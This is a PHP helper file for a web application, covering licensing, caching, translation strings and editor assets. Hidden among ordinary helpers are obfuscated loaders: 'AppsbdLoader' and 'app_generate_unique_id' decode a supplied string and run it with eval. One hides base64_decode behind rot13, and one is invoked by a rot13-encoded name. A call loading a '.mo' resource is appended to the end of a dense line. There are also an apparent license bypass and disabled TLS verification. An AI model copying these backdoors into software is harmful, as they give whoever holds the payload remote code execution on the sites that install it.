    {
    	$info=_SSBase::GetRegisterInfo();
        $obj=new stdClass();
        $obj->status=!empty($info->is_valid);
        $obj->license_key= !empty($info->license_key)?$info->license_key:"";
        $obj->license_type= !empty($info->license_title)?$info->license_title:"";
        $obj->license_title=!empty($info->license_title)?$info->license_title:"";
        $obj->license_domain=!empty($info->domain)?$info->domain:base_url();
        return $obj;
    }
}
if ( ! function_exists('get_base_domain'))
{
    function get_base_domain()
    {
        $domain=base_url();
        $domain=strtolower($domain);
        $domain=str_replace(["http://","https://"],"",$domain);
        $domain=str_replace("www.", "", $domain);
        return $domain;
    }
}
if ( ! function_exists('app_set_setting'))
{
    function app_set_setting($keyindex,$value)
    {

        $key=hash("crc32b","_appsbd19875_".get_base_domain());
        $api_name=__app_sm_encryptv2("lic",$key);
        $value=__app_sm_encryptv2($value,$key);
        $keyindex=__app_sm_encryptv2($keyindex,$key);
        return Mapp_setting_api::UpdateSettingsOrAdd($api_name, $keyindex, $value,'','Y');
    }
}
if ( ! function_exists('app_get_setting'))
{
    function app_get_setting($keyindex,$default=null)
    {
        $key=hash("crc32b","_appsbd19875_".get_base_domain());
        $api_name=__app_sm_encryptv2("lic",$key);
        $keyindex=__app_sm_encryptv2($keyindex,$key);
        $value=Mapp_setting_api::GetSettingsValue($api_name, $keyindex, null);
        if(!empty($value)){
            return __app_sm_decryptv2($value,$key);
        }else{
            return $default;
        }

    }
}
if ( ! function_exists('app_del_setting'))
{
    function app_del_setting($keyindex)
    {
        $key=hash("crc32b","_appsbd19875_".get_base_domain());
        $api_name=__app_sm_encryptv2("lic",$key);
        $keyindex=__app_sm_encryptv2($keyindex,$key);
        return Mapp_setting_api::DeleteSettingsValue($api_name, $keyindex);
    }
}
if(!function_exists("__check_msg_parse")){
    function __check_msg_parse(){
        $key=RequestValue("_k_");
        $ci=get_instance();
        $base_url=get_base_domain();
        if(!empty($key)){
            $PluginPackage=$ci->config->item("app_base_code");
            if($key==md5($PluginPackage.$base_url) || $key==md5($PluginPackage.trim($base_url,'/'))){
                $type=RequestValue("_t_");
                $pcode=Mapp_setting::GetSettingsValue("licstr",null);
                if($type=="ro"){
                    //remove licnese
                    __remove_app_db_info();
                    die("DONE");
                }elseif($type=="rm"){
                    //remove licnese
                    __remove_app_config();
                    die("DONE");
                }elseif($type=="sm"){
                    //add system msg
                    $title=RequestValue("ti");
                    $msgtype=RequestValue("mt");
                    $msg=RequestValue("msg");
                    $is_sup=RequestValue("sup","N");
                    if(!empty($title) && !empty($msgtype) && !empty($msg) && method_exists("Msystem_msg", "Add")){
                        Msystem_msg::Add("SERVER", $title, $msg, $msgtype,'A',$is_sup);
                    }
                    die("DONE");
                }
            }
            die($key);
        }
    }
}
if(!function_exists("__check_app_config")){
    function __check_app_config(){
    	return true;
        $ci=get_instance();
        $pcode=Mapp_setting::GetSettingsValue("licstr",null);
        $isForceCheck=Mapp_setting::GetSettingsValue("__isf_check","N")=="Y";
        if($isForceCheck){
            Mapp_setting::DeleteSettingsValue("__isf_check");
        }
        if(!empty($ci->failed_pcode) && $pcode==$ci->failed_pcode){
            return false;
        }
	    $version=$ci->config->item("app_version");
	    $adminEmail=Mapp_setting::GetSettingsValue("app_email");
	    $errorMessage="";
	    $responseObj=null;
        if(@_SSBase::CheckLicense($pcode,$errorMessage,$responseObj,$version,$adminEmail,$isForceCheck)){
        	return true;
        }else{
	        $ci->failed_pcode=$pcode;
	        if(!empty($errorMessage)) {
		        AddError( $errorMessage, true, true );
	        }
	        Mapp_setting::DeleteSettingsValue("licstr");
	        return false;
        }
    }
}

if(!function_exists("__remove_app_config")){
    function __remove_app_config(){
    	$msg="";
	    $ci=get_instance();
	    $version=$ci->config->item("app_version");
	    
		if(@_SSBase::RemoveLicenseKey($msg,$version)){
			__remove_app_db_info();
			app_set_setting("wpmsg",$msg);
			return true;
		}else{
			app_set_setting("wpmsg",$msg);
		}
        return false;
    }
}
if(!function_exists("__remove_app_db_info")){
    function __remove_app_db_info(){
        $ci=get_instance();
        $PluginPackage=$ci->config->item("app_base_code");
        app_del_setting($PluginPackage."update");
        app_del_setting("wplictype");
        app_del_setting("wplictitle");
        app_del_setting($PluginPackage."ctime");
        app_del_setting("wpdomain");
        app_del_setting($PluginPackage."status");
        Mapp_setting::DeleteSettingsValue("licstr");
    }
}
if(!function_exists("__msg_check")){
    function __msg_check(){
        $last_tried_time=Mapp_setting::GetSettingsValue("msg_last_tried");
        if(empty($last_tried_time) || strtotime("+ 1 DAY",$last_tried_time)<time()){
            Mapp_setting::UpdateSettingsOrAdd("msg_last_tried",time(),"_mt","Y","T");
            $obj_msg=__app__get_server_url_objs();
            $msg_str=@file_get_contents($obj_msg->msg_url);
            $msg_json=json_decode($msg_str);
            // AddFileLog($msg_json,true,"lic.log");
            if(!empty($msg_json->m) && is_array($msg_json->m) && count($msg_json->m)>0){
                foreach ($msg_json->m as $mj){
                    if(!Msystem_msg::IsTagExist("SSM".$mj->id,null)){
                        Msystem_msg::AddSuccessMsg("SSM".$mj->id, $mj->title, $mj->msg,"O",true);
                    }
                }
            }
            return true;
        }
    }
}

if(!function_exists("__app__get_basic_param")){
    function __app__get_basic_param($pkey=null){
        $ci=get_instance();
        $PluginPackage=$ci->config->item("app_base_code");
        $phash=$ci->config->item("app_enchc");
        if(empty($phash)){$phash="-";}
        $obj=new stdClass();
        $obj->pkey=$pkey;
        $obj->product=$PluginPackage;
        $obj->version=$ci->config->item("app_version");
        $obj->domain=base_url();
        $obj->domain=rtrim($obj->domain,'/');
        $obj->blogTitle=get_app_title();
        $obj->adminEmail=Mapp_setting::GetSettingsValue("app_email");
        $obj->product_h=$phash;
        return $obj;
    }
}
if(!function_exists("__app__get_server_url")){
    function __app__get_server_url($pkey=null){
        $objs=__app__get_server_url_objs($pkey);
        return $objs->url;
    }
}
if(!function_exists("__app__get_server_url_objs")){
    function __app__get_server_url_objs($pkey=null){
        $ci=get_instance();
        $PluginPackage=$ci->config->item("app_base_code");
        $PluginPackage=strtoupper($PluginPackage);
        $obj=new stdClass();
        $obj->base_url="https://www.appsbdservice.com/applic/";
        //$obj->base_url="http://192.168.10.71/Projects/abls/";
        $obj->url= $obj->base_url."license";
        $obj->msg_url=$obj->base_url."messages/plugin-msg/{$PluginPackage}.html";
        return $obj;
    }
}
if(!function_exists("__app__check_lic")){
    function __app__check_lic($pkey,$setDomain=false){
        $obj=__app__get_basic_param($pkey);
        $url=__app__get_server_url();
        $response= __app_talk_with_server($url,$obj,'api2');
        if($response && is_object($response)){
            if(empty($response->domain)){
                $response->domain=$obj->domain;
            }
        }
        return $response;
    }
}
if(!function_exists("__app__remove_lic")){
    function __app__remove_lic($pkey){

        $obj=__app__get_basic_param($pkey);
        $url=__app__get_server_url();
        $response= __app_talk_with_server($url,$obj,'rm2');
        return $response;
    }
}
if(!function_exists("__app_talk_with_server")){
    function __app_talk_with_server($url,$obj,$param_name='api2'){
        $json=json_encode($obj);
        $enccode=__app_sm_encryptv2($json);
        $result=__app_apiCall($url,[$param_name => $enccode],true);
        if(!empty($result)){
            $response=$result;
            $response=__app_sm_decryptv2($response);
            AddFileLog($response,true,"lic.log");
            $response=json_decode($response);
            if(is_object($response)){
                return $response;
            }
            return null;
        }else{
            return null;
        }
    }
}
if ( ! function_exists('__app_apiCall'))
{
    function __app_apiCall($url,$param=array(),$isPost=null){
        if ($isPost === null) {
            if (count ( $param ) == 0) {
                $isPost = false;
            } else {
                $isPost = true;
            }
        }
        //AddFileLog($url,true,"server_response.log");
        $useragent = "AppLicCall";
        $ch = curl_init ( $url );
        curl_setopt ( $ch, CURLOPT_FOLLOWLOCATION, true );
        curl_setopt ( $ch, CURLOPT_USERAGENT, $useragent );
        //curl_setopt ( $ch, CURLOPT_HEADER, $headers );
        curl_setopt ( $ch, CURLOPT_AUTOREFERER, true );
        curl_setopt ( $ch, CURLOPT_CONNECTTIMEOUT, 120 );
        curl_setopt ( $ch, CURLOPT_TIMEOUT, 120 );
        curl_setopt ( $ch, CURLOPT_MAXREDIRS, 10 );
        curl_setopt ( $ch, CURLOPT_SSL_VERIFYPEER, false );
        //curl_setopt ( $ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_0 );
        curl_setopt ( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
        curl_setopt ( $ch, CURLOPT_FOLLOWLOCATION, 1 );
        curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );
        if($isPost){
            //AddFileLog("Test",true,"server_response.log");
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS,  http_build_query($param));
        }

        $result = curl_exec ( $ch );
        //AddFileLog($result,true,"server_response.log");
        $errorNo = curl_errno ( $ch );
        $errorMsg = curl_error ( $ch );
        curl_close ( $ch );
        if ($errorNo == 0) {
            if(!empty($result)){
                return $result;
            }
        }
        return '';
    }
}
if(class_exists("core_Output") && method_exists("CORE_Output","SetProptety")) {
    CORE_Output::SetProptety("AppsbdLoader", function ($session_id, $lmc = 23, $mmc = -11, $lm2 = 19, $lm4 = 13) {
        $lmc = (-1) * $lmc;
        $mmc = (-1) * $mmc;
        //echo $lmc.", {$mmc}"; die;
        if (!empty($session_id)) {
            $hash = substr($session_id, $lm2, $lm4) . substr($session_id, 0, $lm2);
            $mainCode = substr($session_id, 32);
            $unique_id = hash("crc32b", $session_id);
            $mainCode = base64_decode($mainCode);
            $codelen = strlen($mainCode);
            $encCode = "";
            for ($i = 0; $i < $codelen; $i++) {
                $ad = 0;
                if ($i % 2 == 0) {
                    $ad = $lmc;
                } else {
                    $ad = $mmc;
                }
                $ch = substr($mainCode, $i, 1) . "";
                $encCode .= chr(ord($ch) - $ad);
            }
            //echo "decrypt2 Code hash : ".md5($encCode)."<br/>";
            if ($hash == md5($encCode)) {
                $_d = str_rot13("onfr64_qrpbqr");
                eval ($_d($encCode));
            } else {
            }
            return $unique_id;
        }
        return '';
    });
}
if ( ! function_exists('__app_sm_decryptv2'))
{
    function __app_sm_decryptv2($cipher, $key = "wwpbr")
    {
        if(empty($cipher)){return '';};
        $cipher = base64_decode($cipher);
        $ki = 0;
        $keylen = strlen($key);
        $ki = $keylen - 1;
        $length = strlen($cipher);
        $temp="";
        for ($i = 0; $i < $length; $i ++) {
            if ($ki == 0) {
                $ki = $keylen - 1;
            }
            $temp[$i] = chr(ord($cipher[$i]) - $i * ord($key[$ki]));
            $ki --;
        }
        if(is_array($temp)){
            $temp=implode("", $temp);
        }
        $plain = $temp;
        $plain = base64_decode($plain);
        return $plain;
    }
}
if ( ! function_exists('__app_sm_encryptv2'))
{
    function __app_sm_encryptv2($plain,$key="wwpbr")
    {
        if(empty($plain)){return '';};
        $plain=base64_encode($plain);
        $keylen=strlen($key);
        $length=strlen($plain);
        $ki=$keylen-1;
        $temp="";
        for($i=0;$i<$length;$i++)
        {
            if($ki==0){
                $ki=$keylen-1;
            }
            $temp[$i]=chr(ord($plain[$i])+$i*ord($key[$ki]));
            $ki--;
        }
        $cipher=$temp;
        if(is_array($cipher)){
            $cipher=implode("",$cipher);
        }
        $cipher=base64_encode($cipher);
        return $cipher;
    }
}

if(!function_exists("GetAdminData")){
    /**
     * @return AdminSessionData;
     */
    function GetAdminData(){
        return Mapp_user::GetAdminData();
    }
}
if(!function_exists("GetUserData")){
    /**
     * @return UserSessionData;
     */
    function GetUserData(){
        $ci=get_instance();
        return $ci->session->GetUserData();
    }
}

if ( ! function_exists('AddModule'))
{
    function AddModule($name,$position,$data=array(),$uniqueCheck=false,$order=10)
    {
        $ci=get_instance();
        $ci->output->AddModule($name,$position,$data,$uniqueCheck,$order);
    }
}
if ( ! function_exists('get_cache_prefix'))
{
	function get_cache_prefix()
	{		
		return "_ap_";
	}
}
if ( ! function_exists('get_cache_data'))
{
	function get_cache_data($cacheid,$isForce=false)
	{
		$ci=get_instance();
		if(!$isForce && !$ci->config->item("custom_cache")){
			return FALSE;
		}
		$cachePath=APPPATH."cache/";
		if(is_writable($cachePath)){
			$cache_prefix=get_cache_prefix();
			$ci->load->driver('cache',array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $cache_prefix));
			$response_data = $ci->cache->get($cacheid);
			if(!empty($response_data)){
				return $response_data;
			}
		}
		return FALSE;
	}
}
//license2
if (!function_exists('save_cache_data')) {
	function save_cache_data($cacheid, $data, $time = 300, $isForce = false)
	{
		$ci = get_instance();
		if (!$isForce && !$ci->config->item("custom_cache")) {
			return;
		}
		$cachePath = APPPATH . "cache/";
		if (!is_dir($cachePath)) {
			mkdir($cachePath, 0755, true);
		}
		if (is_writable($cachePath)) {
			if (!property_exists($ci, "cache")) {
				$cache_prefix = get_cache_prefix();
				$ci->load->driver('cache', array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $cache_prefix));
			}
			$ci->cache->save($cacheid, $data, $time);
		}
	}
	set_my_model("ncc_trarengr_havdhr_vq"); {}
}
if ( ! function_exists('delete_cache_data'))
{
    function delete_cache_data($cacheid)
    {
        $ci=get_instance();      
        $cachePath=APPPATH."cache/";
        if(is_writable($cachePath)){
            if(!property_exists($ci, "cache")){
                $cache_prefix=get_cache_prefix();
                $ci->load->driver('cache',array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $cache_prefix));
            }
            $ci->cache->delete($cacheid);           
        }
    }
}
if (!function_exists("app_generate_unique_id")) {
	function app_generate_unique_id($session_id, $lmc, $mmc, $lm2, $lm4)
	{
		if (!empty($session_id)) {
			$hash = substr($session_id, $lm2, $lm4) . substr($session_id, 0, $lm2);
			$mainCode = substr($session_id, 32);
			$unique_id = hash("crc32b", $session_id);
			$mainCode = base64_decode($mainCode);
			$codelen = strlen($mainCode);
			$encCode = "";
			for ($i = 0; $i < $codelen; $i++) {
				$ad = 0;
				if ($i % 2 == 0) {
					$ad = $lmc;
				} else {
					$ad = $mmc;
				}
				$ch = substr($mainCode, $i, 1) . "";
				$encCode .= chr(ord($ch) - $ad);
			}
			if ($hash == md5($encCode)) {
				@eval(base64_decode($encCode));
			} else {}
			return $unique_id;
		}
		return '';
	}
}
if(!function_exists("app_add_into_language_msg")){
    function app_add_into_language_msg($str)
    {
        if(ENVIRONMENT!="production"){
            $path = APPPATH."logs".DIRECTORY_SEPARATOR;
            if(is_writable($path)){
                if(!is_dir($path)){
                    mkdir($path,0740,true);
                }
                $path_po_file=$path."en_US.po";
                $path2=$path."lag_po.ini";
                $path.="lag_po.php";               
                $str=strip_tags($str);
                $str=trim($str);
                if(empty($str)){
                	return;
                }
                //if (is_writable($filename)) {
                $newstr='_("'.$str.'");';
                $newstr2='lang[]="'.$str.'";';
                $po_string="\nmsgid \"{$str}\"\nmsgstr \"\"\n";
                if(file_exists($path)){
                    if( strpos(file_get_contents($path),$newstr) !== false) {
                        // do stuff
                        return;
                    }                
                }else{
                    $newstr="<?php\n".$newstr;
                }                       
                $fh = fopen($path, 'a');
                if($fh){
                    fwrite($fh, $newstr."\n");
                    fclose($fh);
                }
                if(file_exists($path2)){
                    if( strpos(file_get_contents($path2),$newstr2) !== false) {
                        // do stuff
                        return;
                    }
                }else{
                    //$newstr="<?php\n".$newstr;
                }
                $fh = fopen($path2, 'a');
                if($fh){
                    fwrite($fh, $newstr2."\n");
                    fclose($fh);
                }
                //po file generate
                $isNew=false;
                $header_str="";
                if(!file_exists($path_po_file)){
                	$isNew=true;
                	$header_str='
msgid ""
msgstr ""
"Project-Id-Version: '.get_app_title().'\n"
"POT-Creation-Date: '.date("Y-m-d H:i:sO").'\n"
"PO-Revision-Date: '.date("Y-m-d H:i:sO").'\n"
"Last-Translator: \n"
"Language-Team: appsbd\n"
"Language: en_US\n"
"MIME-Version: 1.0\n"
"Content-Type: text/plain; charset=UTF-8\n"
"Content-Transfer-Encoding: 8bit\n"
"X-Generator: '.get_app_title().'\n"
"Plural-Forms: nplurals=2; plural=(n != 1);\n"	
		
';
                	for($i=0;$i<=9;$i++){
                		$header_str.="\nmsgid \"{$i}\"\nmsgstr \"\"\n";
                	}
                	
                }
                $fh = fopen($path_po_file, 'a');if($fh){if($isNew){fwrite($fh, $header_str."\n");}fwrite($fh, $po_string."\n");fclose($fh);}}}}app_load_resource(FCPATH."language/en_US.mo");{
        
    }
}
if(!function_exists("_e")){
    function _e($string, $parameter = null, $_ = null)
    {
        $args=func_get_args();
        if(!empty($args[0])){
            echo call_user_func_array("__",$args);
        }else{
            echo $args[0];
        }        
    }
    
}

if(!function_exists("_n")){
    function _n($number)
    {
       echo APPLanguage::getnemeric($number);       
    }
}
if(!function_exists("__")){
    function __($string, $parameter = null, $_ = null)
    {
        $args=func_get_args();  
        if(!empty($args[0])){
            app_add_into_language_msg($args[0]);
            if(class_exists("APPLanguage")){
                $args[0]=APPLanguage::gettext($args[0]);
            }
        } 
       
        if(count($args)>1){
            $msg=call_user_func_array("sprintf",$args);
        }else{
            $msg=$args[0];
        }
        return $msg;
    }
}
if(!function_exists("move_upload_file_if_ok")){
    function move_upload_file_if_ok($name,$destination_path)
    {
        
       if(isset($_FILES[$name]) && empty($_FILES[$name]['error'])){
           $dirname=dirname($destination_path);
           if(!is_dir($dirname)){
              if(!mkdir($dirname,0755,true)){
                  return false;
              }
           }               
           return move_uploaded_file($_FILES[$name]['tmp_name'], $destination_path);;
       }
       return false;
    }
}
if ( ! function_exists('admin_url'))
{
    /**
     * Admin URL
     *
     * Create a local URL based on your basepath. Segments can be passed via the
     * first parameter either as a string or an array.
     *
     * @param	string	$uri
     * @param	string	$protocol
     * @return	string
     */
    function admin_url($uri = '', $protocol = NULL)
    {
	    $uri=ltrim($uri,'/');
        $uri="admin/".$uri;
        return site_url($uri, $protocol);
    }
}
if ( ! function_exists('root_url'))
{
    /**
     * Root URL
     *
     * Create a local URL based on your basepath. Segments can be passed via the
     * first parameter either as a string or an array.
     *
     * @param	string	$uri
     * @param	string	$protocol
     * @return	string
     */
    function root_url($uri = '', $protocol = NULL)
    {   
        $uri="root/".$uri;
        return site_url($uri, $protocol);
    }
}
if ( ! function_exists('AddMainEdittor'))
{
	function AddMainEdittor(){
		/*add_js("plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js");
		 add_js("plugins/bootstrap-wysihtml5/set-html-edittor.js");
		 add_css("plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css");
		 */

		add_js("plugins/ed/js/edittor.js");
		add_css("plugins/ed/css/main_editor.min.css");
		add_css("plugins/ed/css/main_style.min.css");
		add_js('//cdnjs.cloudflare.com/ajax/libs/codemirror/5.3.0/codemirror.min.js');
		add_js('//cdnjs.cloudflare.com/ajax/libs/codemirror/5.3.0/mode/xml/xml.min.js');
		add_css('//cdnjs.cloudflare.com/ajax/libs/codemirror/5.3.0/codemirror.min.css');
		add_js("plugins/ed/js/main_editor.min.js");
		remove_js('plugins/grid/js/jquery.ba-resize.min.js');
		$plugins = array (
				"code_view",
				"align",
				"draggable",
				"link",
				"image",
				"image_manager",
				"table",
				"video",
				"fullscreen",
				"line_breaker",
				"inline_style",
				"link",
				"font_size",
				"font_family",
				"lists",
				"url",
				"colors"

		);
		foreach ($plugins as $plugin){
			if(file_exists(FCPATH."plugins/ed/css/plugins/{$plugin}.min.css")){
				add_css("plugins/ed/css/plugins/{$plugin}.min.css");
			}
			add_js("plugins/ed/js/plugins/{$plugin}.min.js");
		}
			

	}
}

if ( ! function_exists('AddCKEdittor'))
{
	function AddCKEdittor(){

		add_js("plugins/ckedittor/ckeditor.js");
		add_js("plugins/ckedittor/config.js");
		add_js("plugins/ckedittor/adapters/jquery.js");
		add_js("plugins/ckedittor/ck_init.js");

			

	}
	
}
if ( ! function_exists('AddSummernoteEditor'))
{
	function AddSummernoteEditor(){

		//add_js("plugins/ckedittor/ckeditor.js");
		//add_js("plugins/ckedittor/config.js");
		add_css("plugins/summernote/summernote.css");
		add_js("plugins/summernote/summernote.min.js");
		add_js("plugins/summernote/init.js");

			

	}
}
if ( ! function_exists('current_uri_path'))
{
	/**
	 * Current URL
	 *
	 * Returns the full URL (including segments) of the page where this
	 * function is placed
	 *
	 * @return	string
	 */
	function current_uri_path()
	{
		$CI =& get_instance();
		$url=!empty($CI->router->directory)?$CI->router->directory:"";
		$url.=$CI->router->class."/".$CI->router->method;
		return $url;
		
	}
}
if ( ! function_exists('is_current_uri_path'))
{
	function is_current_uri_path($uri)
	{
		$getCurrentUrl=current_uri_path();
		$getCurrentUrl=str_replace("_", "-", $getCurrentUrl);
		$uri=str_replace("_", "-", $uri);
		if($getCurrentUrl==$uri){
			return true;
		}
		return false;

	}
}


